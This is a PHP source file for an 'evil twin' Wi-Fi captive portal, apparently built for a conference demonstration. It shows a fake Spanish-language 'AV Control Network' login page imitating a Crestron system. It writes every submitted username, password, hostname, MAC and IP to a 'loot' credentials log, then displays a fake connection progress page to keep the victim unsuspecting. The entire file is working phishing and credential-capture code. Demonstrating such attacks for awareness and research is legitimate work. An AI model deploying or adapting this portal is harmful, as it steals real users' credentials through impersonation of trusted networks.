<?php
/**
 * AV Demo Captive Portal — BICSI-CALA 2026
 * Based on goodportal_configure/captiveportal.php by spencershepard (GRIMM)
 *
 * Credential capture and whitelist handler for AV Evil Twin demo.
 * Deployed to $PORTAL_ROOT/ by 1_setup_portal/payload.sh
 *
 * filter_var() is not valid in this implementation of php
 */

// Configuration
define('LOG_FILE', '/root/loot/av_demo/credentials.log');
define('WHITELIST_FILE', '/tmp/av_demo_whitelist.txt');
define('DEFAULT_REDIRECT', 'http://172.16.52.1/');

// Only process POST requests with credentials
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['usuario'])) {

    // Capture submitted data
    $usuario  = isset($_POST['usuario'])   ? trim($_POST['usuario'])   : '';
    $password = isset($_POST['password'])  ? trim($_POST['password'])  : '';
    $hostname = isset($_POST['hostname'])  ? trim($_POST['hostname'])  : '';
    $mac      = isset($_POST['mac'])       ? trim($_POST['mac'])       : '';
    $ip       = !empty($_POST['ip'])        ? trim($_POST['ip'])        : $_SERVER['REMOTE_ADDR'];
    $target   = isset($_POST['target'])    ? trim($_POST['target'])    : DEFAULT_REDIRECT;

    // Log credentials
    if (!empty($usuario) && !empty($password)) {
        $logEntry = "[" . date('Y-m-d H:i:s') . " UTC]\n" .
                    "Usuario: {$usuario}\n" .
                    "Password: {$password}\n" .
                    "Hostname: {$hostname}\n" .
                    "MAC: {$mac}\n" .
                    "IP:  {$ip}\n" .
                    "Target: {$target}\n" .
                    str_repeat('-', 50) . "\n\n";

        @file_put_contents(LOG_FILE, $logEntry, FILE_APPEND | LOCK_EX);
    }

    // Whitelist client IP address (more reliable than MAC)
    $clientIP = $_SERVER['REMOTE_ADDR'];
    if (!empty($clientIP) && preg_match('/^([0-9]{1,3}\.){3}[0-9]{1,3}$/', $clientIP)) {
        $currentWhitelist = @file_get_contents(WHITELIST_FILE);
        if ($currentWhitelist === false || strpos($currentWhitelist, $clientIP) === false) {
            @file_put_contents(WHITELIST_FILE, $clientIP . "\n", FILE_APPEND | LOCK_EX);
        }
    }

    // Validate and prepare target URL
    if (empty($target) || (strpos($target, 'http://') !== 0 && strpos($target, 'https://') !== 0)) {
        $target = DEFAULT_REDIRECT;
    }

    // Send HTML page with progress indicator and auto-retry
    // Handles the delay while whitelist monitor processes IP and applies firewall rules
    header('Content-Type: text/html; charset=utf-8');
    echo '<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Conectando al Sistema AV...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; background: #0d1b2a; min-height: 100vh; display: flex; align-items: center; justify-content: center; color: white; }
        .container { text-align: center; padding: 40px; max-width: 500px; }
        h1 { font-size: 24px; margin-bottom: 10px; font-weight: 600; color: #2196F3; }
        .message { font-size: 15px; opacity: 0.85; margin-bottom: 30px; }
        .progress-container { background: rgba(255,255,255,0.15); border-radius: 20px; height: 8px; overflow: hidden; margin-bottom: 20px; }
        .progress-bar { height: 100%; background: #2196F3; border-radius: 20px; width: 0%; transition: width 0.3s ease; }
        .status { font-size: 13px; opacity: 0.75; }
        .spinner { border: 3px solid rgba(33,150,243,0.3); border-top: 3px solid #2196F3; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .brand { font-size: 11px; color: rgba(255,255,255,0.3); margin-top: 28px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h1>Conectando al Sistema AV...</h1>
        <p class="message">Configurando acceso a la red de control...</p>
        <div class="progress-container">
            <div class="progress-bar" id="progress"></div>
        </div>
        <p class="status" id="status">Inicializando conexión...</p>
        <p class="brand">AV Control Network | Crestron DM-NVX | v4.2.1</p>
    </div>
    <script>
        var target = ' . json_encode($target) . ';
        var checkInterval = 2000;
        var startTime = Date.now();
        var progressBar = document.getElementById("progress");
        var statusText = document.getElementById("status");
        var attempt = 0;

        var messages = [
            "Verificando credenciales...",
            "Configurando acceso AV...",
            "Estableciendo conexión segura...",
            "Negociando acceso a la red...",
            "Finalizando configuración...",
            "Probando conexión...",
            "Esperando disponibilidad de red..."
        ];

        function updateProgress() {
            var elapsed = Date.now() - startTime;
            var progress = 100 * (1 - Math.exp(-elapsed / 30000));
            progressBar.style.width = Math.min(progress, 95) + "%";

            var messageIndex = Math.floor((elapsed / 8000)) % messages.length;
            statusText.textContent = messages[messageIndex];
        }

        function tryConnect() {
            attempt++;

            var img = new Image();
            var timestamp = new Date().getTime();

            img.onload = function() {
                progressBar.style.width = "100%";
                statusText.textContent = "¡Conectado! Redirigiendo...";
                setTimeout(function() {
                    window.location.href = target;
                }, 500);
            };

            img.onerror = function() {
                setTimeout(tryConnect, checkInterval);
            };

            img.src = "http://www.google.com/images/phd/px.gif?" + timestamp;
        }

        setInterval(updateProgress, 200);
        setTimeout(tryConnect, 1000);
    </script>
</body>
</html>';
    exit;
}

// Show AV-themed login form on GET requests
header('Content-Type: text/html; charset=utf-8');
echo '<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>AV Control Network</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
            background: #0d1b2a;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: white;
        }
        .card {
            background: #1e3a5f;
            border-radius: 12px;
            padding: 40px 36px;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 8px 32px rgba(0,0,0,0.5);
        }
        .logo-bar {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 6px;
        }
        .logo-icon {
            width: 38px;
            height: 38px;
            background: #2196F3;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 12px;
            font-size: 20px;
            flex-shrink: 0;
        }
        h1 {
            font-size: 17px;
            font-weight: 700;
            color: #ffffff;
            line-height: 1.35;
        }
        h1 span {
            display: block;
            font-weight: 400;
            font-size: 13px;
            color: #2196F3;
            margin-top: 2px;
        }
        .subtitle {
            font-size: 12px;
            color: rgba(255,255,255,0.45);
            text-align: center;
            margin: 10px 0 24px;
        }
        .divider {
            border: none;
            border-top: 1px solid rgba(255,255,255,0.1);
            margin-bottom: 24px;
        }
        label {
            display: block;
            font-size: 11px;
            color: rgba(255,255,255,0.6);
            text-transform: uppercase;
            letter-spacing: 0.08em;
            margin-bottom: 6px;
        }
        input[type=text], input[type=password] {
            width: 100%;
            padding: 12px 14px;
            background: rgba(255,255,255,0.07);
            border: 1px solid rgba(255,255,255,0.15);
            border-radius: 6px;
            color: white;
            font-size: 15px;
            outline: none;
            margin-bottom: 18px;
            transition: border-color 0.2s;
        }
        input[type=text]:focus, input[type=password]:focus {
            border-color: #2196F3;
        }
        input[type=text]::placeholder, input[type=password]::placeholder {
            color: rgba(255,255,255,0.25);
        }
        button[type=submit] {
            width: 100%;
            padding: 13px;
            background: #2196F3;
            border: none;
            border-radius: 6px;
            color: white;
            font-size: 13px;
            font-weight: 700;
            letter-spacing: 0.1em;
            cursor: pointer;
            text-transform: uppercase;
            transition: background 0.2s;
        }
        button[type=submit]:hover { background: #1976D2; }
        .info-bar {
            font-size: 11px;
            color: rgba(255,255,255,0.3);
            text-align: center;
            margin-top: 20px;
            line-height: 1.7;
        }
        .footer {
            margin-top: 24px;
            font-size: 10px;
            color: rgba(255,255,255,0.18);
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo-bar">
            <div class="logo-icon">&#9654;</div>
            <h1>AV Control Network
                <span>Sistema de Control Inalámbrico</span>
            </h1>
        </div>
        <p class="subtitle">Autenticación requerida para acceso a la red</p>
        <hr class="divider">
        <form method="POST" action="">
            <label for="usuario">Usuario</label>
            <input type="text" id="usuario" name="usuario"
                   placeholder="usuario@empresa.com"
                   autocomplete="username" required>

            <label for="password">Contraseña</label>
            <input type="password" id="password" name="password"
                   placeholder="••••••••"
                   autocomplete="current-password" required>

            <input type="hidden" name="hostname" id="h_hostname" value="">
            <input type="hidden" name="mac" value="">
            <input type="hidden" name="ip" id="h_ip" value="">
            <input type="hidden" name="target" value="http://www.google.com/">

            <button type="submit">Iniciar Sesión</button>
        </form>
        <p class="info-bar">
            Sala: Ballroom A &nbsp;|&nbsp; Sistema: Crestron DM-NVX &nbsp;|&nbsp; v4.2.1
        </p>
    </div>
    <p class="footer">AV Control Network &copy; 2026 &mdash; Acceso autorizado únicamente</p>
    <script>
        // Populate hidden fields with client-side info for richer credential logs
        try { document.getElementById("h_hostname").value = window.location.hostname; } catch(e) {}
        // IP is populated server-side via REMOTE_ADDR; this is a fallback label
        try {
            var x = new XMLHttpRequest();
            x.open("GET", "/", false);
            x.send();
        } catch(e) {}
    </script>
</body>
</html>';
?>
